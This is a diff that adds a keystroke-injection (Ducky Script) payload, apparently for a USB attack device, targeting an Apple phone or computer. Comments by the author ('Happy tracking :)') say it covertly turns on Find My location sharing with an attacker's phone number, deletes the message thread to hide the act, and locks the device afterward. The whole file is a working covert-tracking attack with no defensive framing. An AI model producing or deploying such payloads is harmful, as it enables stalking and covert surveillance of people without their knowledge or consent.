@@ -1,0 +1,105 @@
+REM enables find my friends with new number 
+REM deletes number after for obfuscation purposes 
+REM Author:FLYNN 
+REM Change phone number accordingly
+REM Happy tracking :)
+REM on opening of keyboard access it needs UI to click it but the rest is autonamous
+REM locks the phone on finish so its like you were never there ;)
+DELAY 500
+COMMAND SPACE 
+DELAY 500
+STRING mess
+DELAY 200
+ENTER 
+DELAY 700
+COMMAND n 
+STRING +44 example phone number
+DELAY 500
+TAB
+DELAY 200
+STRING hey mate could you bring the money down teusday?
+DELAY 800
+RETURN 
+LED_R
+GUI h 
+DELAY 450
+GUI h 
+DELAY 450
+GUI SPACE 
+DELAY 600
+STRING Full Keyboard Access
+DELAY 850
+ENTER
+DELAY 600
+TAB 
+LED_G
+DELAY 100
+LED_R
+DELAY 500
+COMMAND SPACE 
+DELAY 300
+STRING find my 
+DELAY 500
+ENTER 
+DELAY 800
+TAB 
+DELAY 400
+TAB 
+DELAY 400
+CONTROL TAB
+DELAY 400
+SPACE
+DELAY 400
+SPACE  
+DELAY 500
+STRING +44 same phone number as previous
+DELAY 400
+ENTER 
+DELAY 400
+CONTROL TAB
+DELAY 400
+TAB 
+DELAY 400
+TAB
+DELAY 400
+TAB 
+DELAY 400
+TAB 
+DELAY 400
+SPACE 
+DELAY 400
+UPARROW
+DELAY 400
+SPACE 
+LED_G
+DELAY 100 
+LED_R
+COMMAND SPACE
+DELAY 300
+STRING mess
+DELAY 200
+ENTER
+DELAY 700
+TAB
+DELAY 100
+ENTER 
+DELAY 200
+DOWNARROW
+DELAY 100
+ENTER
+DELAY 400
+DOWNARROW
+DELAY 300
+ENTER 
+DELAY 300
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER 
+DELAY 300
+UPARROW
+DELAY 200
+UPARROW
+DELAY 500
+TAB l
